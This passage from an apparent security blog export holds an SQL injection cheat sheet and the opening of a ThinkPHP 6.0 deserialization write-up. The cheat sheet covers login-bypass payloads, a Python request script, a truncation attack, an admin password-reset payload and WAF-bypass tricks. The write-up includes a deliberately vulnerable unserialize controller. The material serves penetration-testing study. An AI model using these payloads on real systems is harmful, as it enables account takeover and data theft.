<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span>A8<span class="operator">%</span><span class="number">27</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;<span class="comment">-- 2</span></span><br><span class="line"><span class="operator">%</span><span class="number">8</span>C<span class="operator">%</span>A8<span class="operator">%</span><span class="number">27</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">-- 2</span></span><br><span class="line"><span class="operator">%</span>bf<span class="string">&#x27; or 1=1 -- --</span></span><br></pre></td></tr></table></figure>

<p>Python script:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://example.com/index.php&quot;</span> </span><br><span class="line">cookies = <span class="built_in">dict</span>(PHPSESSID=<span class="string">&#x27;4j37giooed20ibi12f3dqjfbkp3&#x27;</span>) </span><br><span class="line">datas = &#123;<span class="string">&quot;login&quot;</span>: <span class="built_in">chr</span>(<span class="number">0xbf</span>) + <span class="built_in">chr</span>(<span class="number">0x27</span>) + <span class="string">&quot;OR 1=1 #&quot;</span>, <span class="string">&quot;password&quot;</span>:<span class="string">&quot;test&quot;</span>&#125; </span><br><span class="line">r = requests.post(url, data = datas, cookies=cookies, headers=&#123;<span class="string">&#x27;referrer&#x27;</span>:url&#125;) </span><br><span class="line"><span class="built_in">print</span> r.text</span><br></pre></td></tr></table></figure>

<h3 id="Polyglot-injection【多语境注入】-multicontext"><a href="#Polyglot-injection【多语境注入】-multicontext" class="headerlink" title="Polyglot injection【多语境注入】 (multicontext)"></a>Polyglot injection【多语境注入】 (multicontext)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">SLEEP(<span class="number">1</span>) <span class="comment">/*&#x27; or SLEEP(1) or &#x27;&quot; or SLEEP(1) or &quot;*/</span></span><br></pre></td></tr></table></figure>

<h2 id="Insert-Statement"><a href="#Insert-Statement" class="headerlink" title="Insert Statement"></a>Insert Statement</h2><h3 id="Modify-password-of-existing-object-x2F-user"><a href="#Modify-password-of-existing-object-x2F-user" class="headerlink" title="Modify password of existing object&#x2F;user"></a>Modify password of existing object&#x2F;user</h3><p>To do so you should try to <strong>create a new object named as the “master object”</strong> (probably <strong>admin</strong> in case of users) modifying something:</p>
<ul>
<li>Create user named: <strong>AdMIn</strong> (uppercase &amp; lowercase letters)</li>
<li>Create a user named: <strong>admin&#x3D;</strong></li>
<li><strong>SQL Truncation Attack【sql截断攻击】</strong> (when there is some kind of <strong>length limit</strong> in the username or email) –&gt; Create user with name: <strong>admin [a lot of spaces] a</strong></li>
</ul>
<h4 id="SQL-Truncation-Attack"><a href="#SQL-Truncation-Attack" class="headerlink" title="SQL Truncation Attack"></a>SQL Truncation Attack</h4><p>If the database is vulnerable and the max number of chars for username is for example 30 and you want to impersonate the user <strong>admin</strong>, try to create a username called: “<em>admin [30 spaces] a</em>“ and any password.</p>
<p>The database will <strong>check</strong> if the introduced <strong>username</strong> <strong>exists</strong> inside the database. If <strong>not</strong>, it will <strong>cut</strong> the <strong>username</strong> to the <strong>max allowed number of characters</strong> (in this case to: “<em>admin [25 spaces]</em>“) and the it will <strong>automatically remove all the spaces at the end updating</strong> inside the database the user “<strong>admin</strong>“ with the <strong>new password</strong> (some error could appear but it doesn’t means that this hasn’t worked).</p>
<p>More info: <a href="https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html">https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html</a> &amp; <a href="https://resources.infosecinstitute.com/sql-truncation-attack/#gref">https://resources.infosecinstitute.com/sql-truncation-attack/#gref</a></p>
<p><em>Note: This attack will no longer work as described above in latest MySQL installations. While comparisons still ignore trailing whitespace by default, attempting to insert a string that is longer than the length of a field will result in an error, and the insertion will fail. For more information about about this check</em> <a href="https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation"><em>https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation</em></a>__</p>
<h3 id="MySQL-Insert-time-based-checking"><a href="#MySQL-Insert-time-based-checking" class="headerlink" title="MySQL Insert time based checking"></a>MySQL Insert time based checking</h3><p><strong>Add as much <code>&#39;,&#39;&#39;,&#39;&#39;</code> as you consider to exit the VALUES statement【大意：添加足够的 <code>&#39;,&#39;&#39;,&#39;&#39;</code>，用以闭合 VALUES 语境】</strong>. If delay is executed, you have a SQLInjection.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">name<span class="operator">=</span><span class="string">&#x27;,&#x27;&#x27;);WAITFOR%20DELAY%20&#x27;</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">5</span><span class="string">&#x27;--%20-</span></span><br></pre></td></tr></table></figure>

<h3 id="ON-DUPLICATE-KEY-UPDATE"><a href="#ON-DUPLICATE-KEY-UPDATE" class="headerlink" title="ON DUPLICATE KEY UPDATE"></a>ON DUPLICATE KEY UPDATE</h3><p>ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Inject using payload:</span><br><span class="line">attacker_dummy@example.com&quot;, &quot;bcrypt_hash_of_qwerty&quot;), (&quot;admin@example.com&quot;, &quot;bcrypt_hash_of_qwerty&quot;) ON DUPLICATE KEY UPDATE password=&quot;bcrypt_hash_of_qwerty&quot; --</span><br><span class="line"></span><br><span class="line">The query would look like this:</span><br><span class="line">INSERT INTO users (email, password) VALUES (&quot;attacker_dummy@example.com&quot;, &quot;bcrypt_hash_of_qwerty&quot;), (&quot;admin@example.com&quot;, &quot;bcrypt_hash_of_qwerty&quot;) ON DUPLICATE KEY UPDATE password=&quot;bcrypt_hash_of_qwerty&quot; -- &quot;, &quot;bcrypt_hash_of_your_password_input&quot;);</span><br><span class="line"></span><br><span class="line">This query will insert a row for the user “attacker_dummy@example.com”. It will also insert a row for the user “admin@example.com”.</span><br><span class="line">Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to &quot;bcrypt_hash_of_qwerty&quot;.</span><br><span class="line"></span><br><span class="line">After this, we can simply authenticate with “admin@example.com” and the password “qwerty”!</span><br></pre></td></tr></table></figure>

<h3 id="Extract-information"><a href="#Extract-information" class="headerlink" title="Extract information"></a>Extract information</h3><h4 id="Creating-2-accounts-at-the-same-time"><a href="#Creating-2-accounts-at-the-same-time" class="headerlink" title="Creating 2 accounts at the same time"></a>Creating 2 accounts at the same time</h4><p>When trying to create a new user and username, password and email are needed:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQLi payload:</span><br><span class="line">username=TEST&amp;password=TEST&amp;email=TEST&#x27;),(&#x27;otherUsername&#x27;,&#x27;otherPassword&#x27;,(select flag from flag limit 1))-- -</span><br><span class="line"></span><br><span class="line">A new user with username=otherUsername, password=otherPassword, email:FLAG will be created</span><br></pre></td></tr></table></figure>

<h4 id="Using-decimal-or-hexadecimal"><a href="#Using-decimal-or-hexadecimal" class="headerlink" title="Using decimal or hexadecimal"></a>Using decimal or hexadecimal</h4><p>With this technique you can extract information creating only 1 account. It is important to note that you don’t need to comment anything.</p>
<p>Using <strong>hex2dec</strong> and <strong>substr</strong>:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+&#x27;</span></span><br></pre></td></tr></table></figure>

<p>To get the text you can use:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;binascii&#x27;</span>).unhexlify(<span class="built_in">hex</span>(<span class="number">215573607263</span>)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>

<p>Using <strong>hex</strong> and <strong>replace</strong> (and <strong>substr</strong>):</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+(select hex(replace(replace(replace(replace(replace(replace(table_name,&quot;j&quot;,&quot; &quot;),&quot;k&quot;,&quot;!&quot;),&quot;l&quot;,&quot;\&quot;&quot;),&quot;m&quot;,&quot;#&quot;),&quot;o&quot;,&quot;$&quot;),&quot;_&quot;,&quot;%&quot;)) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),&quot;j&quot;,&quot; &quot;),&quot;k&quot;,&quot;!&quot;),&quot;l&quot;,&quot;\&quot;&quot;),&quot;m&quot;,&quot;#&quot;),&quot;o&quot;,&quot;$&quot;),&quot;_&quot;,&quot;%&quot;)) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+&#x27;</span></span><br><span class="line"></span><br><span class="line">#<span class="keyword">Full</span> ascii uppercase <span class="keyword">and</span> lowercase replace:</span><br><span class="line"><span class="string">&#x27;+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),&quot;j&quot;,&quot; &quot;),&quot;k&quot;,&quot;!&quot;),&quot;l&quot;,&quot;\&quot;&quot;),&quot;m&quot;,&quot;#&quot;),&quot;o&quot;,&quot;$&quot;),&quot;_&quot;,&quot;%&quot;),&quot;z&quot;,&quot;&amp;&quot;),&quot;J&quot;,&quot;&#x27;</span>&quot;),&quot;K&quot;,&quot;`&quot;),&quot;L&quot;,&quot;(&quot;),&quot;M&quot;,&quot;)&quot;),&quot;N&quot;,&quot;@&quot;),&quot;O&quot;,&quot;$$&quot;),&quot;Z&quot;,&quot;<span class="operator">&amp;&amp;</span>&quot;)) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="Routed-SQL-injection"><a href="#Routed-SQL-injection" class="headerlink" title="Routed SQL injection"></a>Routed SQL injection</h2><p>Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output. (<a href="http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt">Paper</a>)<br><strong>“Routed SQL injection”</strong> 情况与 <strong>“Exploiting Hidden Union Based”</strong> 介绍文章第三种情况一样。</p>
<p><a href="http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt">Paper</a> 中的演示代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$db_database</span> = <span class="string">&quot;finecms&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$db_database</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;SELECT uid,password FROM fn_member WHERE uid=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>,<span class="variable">$conn</span>))<span class="keyword">die</span>(<span class="string">&quot;Error While Selection process : &quot;</span> . <span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>) == <span class="number">0</span>)<span class="keyword">die</span>();</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>, MYSQL_ASSOC);</span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;SELECT username FROM fn_member WHERE password=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;font color=red&gt;This is the query which gives you Output : &lt;/font&gt;<span class="subst">$query</span>&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>,<span class="variable">$conn</span>))<span class="keyword">die</span>(<span class="string">&quot;Error While Selection process : &quot;</span> . <span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>) == <span class="number">0</span>)<span class="keyword">die</span>(<span class="string">&quot;Invalid Input parameter&quot;</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>, MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Username is : &#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Example:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#Hex <span class="keyword">of</span>: <span class="number">-1</span><span class="string">&#x27; union select login,password from users-- a</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061</span> <span class="comment">-- a</span></span><br></pre></td></tr></table></figure>

<h2 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h2><h3 id="No-spaces-bypass"><a href="#No-spaces-bypass" class="headerlink" title="No spaces bypass"></a>No spaces bypass</h3><p>No Space (%20) - bypass using whitespace alternatives</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">09</span><span class="keyword">and</span><span class="operator">%</span><span class="number">091</span><span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">09</span><span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>Dand<span class="operator">%</span><span class="number">0</span>D1<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>D<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>Cand<span class="operator">%</span><span class="number">0</span>C1<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>C<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>Band<span class="operator">%</span><span class="number">0</span>B1<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>B<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>Aand<span class="operator">%</span><span class="number">0</span>A1<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">0</span>A<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>A0and<span class="operator">%</span>A01<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>A0<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>No Whitespace - bypass using comments</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="comment">/*comment*/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>No Whitespace - bypass using parenthesis</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span>(<span class="number">1</span>)<span class="keyword">and</span>(<span class="number">1</span>)<span class="operator">=</span>(<span class="number">1</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h3 id="No-commas-bypass"><a href="#No-commas-bypass" class="headerlink" title="No commas bypass"></a>No commas bypass</h3><p>No Comma - bypass using OFFSET, FROM and JOIN</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LIMIT 0,1         -&gt; LIMIT 1 OFFSET 0</span><br><span class="line">SUBSTR(&#x27;SQL&#x27;,1,1) -&gt; SUBSTR(&#x27;SQL&#x27; FROM 1 FOR 1).</span><br><span class="line">SELECT 1,2,3,4    -&gt; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d</span><br></pre></td></tr></table></figure>

<h3 id="Generic-Bypasses"><a href="#Generic-Bypasses" class="headerlink" title="Generic Bypasses"></a>Generic Bypasses</h3><p>Blacklist using keywords - bypass using uppercase&#x2F;lowercase</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AnD</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">aNd</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure>

<p>Blacklist using keywords case insensitive - bypass using an equivalent operator</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND   -&gt; &amp;&amp; -&gt; %26%26</span><br><span class="line">OR    -&gt; || -&gt; %7C%7C</span><br><span class="line">=     -&gt; LIKE,REGEXP,RLIKE, not &lt; and not &gt;</span><br><span class="line">&gt; X   -&gt; not between 0 and X</span><br><span class="line">WHERE -&gt; HAVING --&gt; LIMIT X,1 -&gt; group_concat(CASE(table_schema)When(database())Then(table_name)END) -&gt; group_concat(if(table_schema=database(),table_name,null))</span><br></pre></td></tr></table></figure>

<h3 id="Scientific-Notation-WAF-bypass"><a href="#Scientific-Notation-WAF-bypass" class="headerlink" title="Scientific Notation WAF bypass"></a>Scientific Notation WAF bypass</h3><p>You can find a more in depth explaination of this trick in <a href="https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/">gosecure blog</a>.<br>Basically you can use the scientific notation in unexpected ways for the WAF to bypass it:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; or 1.e(1) or &#x27;1&#x27;=&#x27;1</span><br><span class="line">-1&#x27; or 1337.1337e1 or &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; or 1.e(&#x27;&#x27;)=</span><br></pre></td></tr></table></figure>

<h3 id="Bypass-Column-Names-Restriction【限制】"><a href="#Bypass-Column-Names-Restriction【限制】" class="headerlink" title="Bypass Column Names Restriction【限制】"></a>Bypass Column Names <strong>Restriction【限制】</strong></h3><p>First of all, notice that if the <strong>original query and the table where you want to extract the flag from have the same amount of columns</strong> you might just do: <code>0 UNION SELECT * FROM flag</code></p>
<p>It’s possible to <strong>access the third column of a table without using its name</strong> using a query like the following: <code>SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;</code>, so in an sqlinjection this would looks like:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This is an example with 3 columns that will extract the column number 3</span></span><br><span class="line">-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;</span><br></pre></td></tr></table></figure>

<p>Or using a <strong>comma bypass</strong>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># In this case, it&#x27;s extracting the third value from a 4 values table and returning 3 values in the &quot;union select&quot;</span></span><br><span class="line">-1 union select * from (select 1)a <span class="built_in">join</span> (select 2)b <span class="built_in">join</span> (select F.3 from (select * from (select 1)q <span class="built_in">join</span> (select 2)w <span class="built_in">join</span> (select 3)e <span class="built_in">join</span> (select 4)r union select * from flag <span class="built_in">limit</span> 1 offset 5)F)c</span><br></pre></td></tr></table></figure>

<p>This trick was taken from <a href="https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/">https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/</a></p>
<h3 id="WAF-bypass-suggester-tools"><a href="#WAF-bypass-suggester-tools" class="headerlink" title="WAF bypass suggester tools"></a>WAF bypass suggester tools</h3><p>url&#x3D;”<a href="https://github.com/m4ll0k/Atlas">https://github.com/m4ll0k/Atlas</a></p>
<h2 id="Other-Guides"><a href="#Other-Guides" class="headerlink" title="Other Guides"></a>Other Guides</h2><ul>
<li><a href="https://sqlwiki.netspi.com/">https://sqlwiki.netspi.com/</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</a></li>
</ul>
<h2 id="Brute-Force-Detection-List"><a href="#Brute-Force-Detection-List" class="headerlink" title="Brute-Force Detection List"></a>Brute-Force Detection List</h2><p>url&#x3D;”<a href="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt&quot;">https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt&quot;</a></p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP6.0.*反序列化漏洞-1</title>
    <url>/2022/03/19/ThinkPHP6-0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/</url>
    <content><![CDATA[<h2 id="0x01-搭建环境"><a href="#0x01-搭建环境" class="headerlink" title="0x01-搭建环境"></a>0x01-搭建环境</h2><h3 id="官方安装教程：https-www-kancloud-cn-manual-thinkphp6-0-1037481"><a href="#官方安装教程：https-www-kancloud-cn-manual-thinkphp6-0-1037481" class="headerlink" title="官方安装教程：https://www.kancloud.cn/manual/thinkphp6_0/1037481"></a>官方安装教程：<a href="https://www.kancloud.cn/manual/thinkphp6_0/1037481">https://www.kancloud.cn/manual/thinkphp6_0/1037481</a></h3><h3 id="踩坑一"><a href="#踩坑一" class="headerlink" title="踩坑一"></a>踩坑一</h3><p>可能遇到的问题 composer 目录为空的情况，解决办法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1. 切换到根目录、核心框架目录，更新。指令如下: </span></span><br><span class="line">composer update </span><br><span class="line"><span class="comment">#2. 更新composer自身，指令如下：</span></span><br><span class="line">composer seft-update</span><br></pre></td></tr></table></figure>

<h3 id="踩坑二"><a href="#踩坑二" class="headerlink" title="踩坑二"></a>踩坑二</h3><p>update 的时候提示：<code>Your requirements could not be resolved to an installable set of packages. </code>解决办法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#composer 可以设置忽略版本匹配</span></span><br><span class="line">composer update --ignore-platform-reqs</span><br></pre></td></tr></table></figure>

<h2 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02-利用条件"></a>0x02-利用条件</h2><p>利用条件为存在 <code>unserialize()</code> 函数且参数可控。手动创造条件验证漏洞，在Index控制器中写入：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);   <span class="comment">// 参数可控的unserialize函数</span></span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to ThinkPHP!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x03-构造POP"><a href="#0x03-构造POP" class="headerlink" title="0x03-构造POP"></a>0x03-构造POP</h2><p>反序列化漏洞起点通常为  <code>__destruct()</code> 及 <code>__wake()</code> 两个魔术函数，因为它们就是 <code>unserialize</code> 的触发点。</p>
<h3 id="搜索-destruct-方法"><a href="#搜索-destruct-方法" class="headerlink" title="搜索 __destruct 方法"></a>搜索 __destruct 方法</h3><p>全文搜索 <code>__destruct</code> ，发现 <code>Model.php</code> 存在该方法，尝试从该点出发挖掘反序列化漏洞。根据 <code>__destruct</code> 方法代码可知，当 <code>$this-&gt;lazySave = True</code> 的时候，会进入 <code>$this-&gt;save()</code> 方法。</p>
<h3 id="跟进-save-方法"><a href="#跟进-save-方法" class="headerlink" title="跟进 save() 方法"></a>跟进 save() 方法</h3><p>漏洞利用点存在于 <code>$this-&gt;updateData()</code> 内部，需要进入 <code>$this-&gt;updateData()</code> 方法：</p>
<ol>
<li>在此之前则不能被 return ，所以 if 语句中的 <code>$this-&gt;isEmpty()</code> 必须等于 <code>false</code> 以及 <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code> 必须等于 <code>true</code> 才能避免 return；</li>
<li><code>$this-&gt;exists</code> 必须为 <code>true</code>。</li>
</ol>
<p>跟进 <code>$this-&gt;isEmpty()</code>，要想 <code>$this-&gt;isEmpty() </code>等于 <code>false</code>，只需要 <code>$tish-&gt;data </code>不等于空。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>跟进 <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code>，要想 <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code> 等于 <code>ture</code>，只需要 <code>$this-&gt;withEvent</code> 等于 <em>空</em> 或 <code>false</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$event</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;withEvent) &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$call</span> = <span class="string">&#x27;on&#x27;</span> . <span class="title class_">Str</span>::<span class="title function_ invoke__">studly</span>(<span class="variable">$event</span>);</span><br><span class="line"> <span class="keyword">try</span> &#123;...&#125; <span class="keyword">catch</span> (ModelEventException <span class="variable">$e</span>) &#123;...&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="跟进-updateData-方法"><a href="#跟进-updateData-方法" class="headerlink" title="跟进 updateData() 方法"></a>跟进 updateData() 方法</h3><p>漏洞利用点存在于 <code>$this-&gt;checkAllowFields()</code> 内部，需要进入 <code>$this-&gt;checkAllowFields()</code> 方法，在此之前则不能被 return。</p>
<p>第一个 if 语句中，<code>$this-&gt;trigger(&#39;BeforeUpdate&#39;))</code> 需要为 true，上一步已经设置。</p>
<p>第二个 if 语句中，<code>$data</code> 需要为 true 或不为 <em>空</em> ，<code>$data</code> 来自 <code>$this-&gt;getChangedData()</code>，跟进 <code>$this-&gt;getChangedData()</code>，只需要将 <code>$this-&gt;force</code> 为 <code>true</code> 即可直接原封不动返回 <code>$this-&gt;$data</code> 的值。</p>
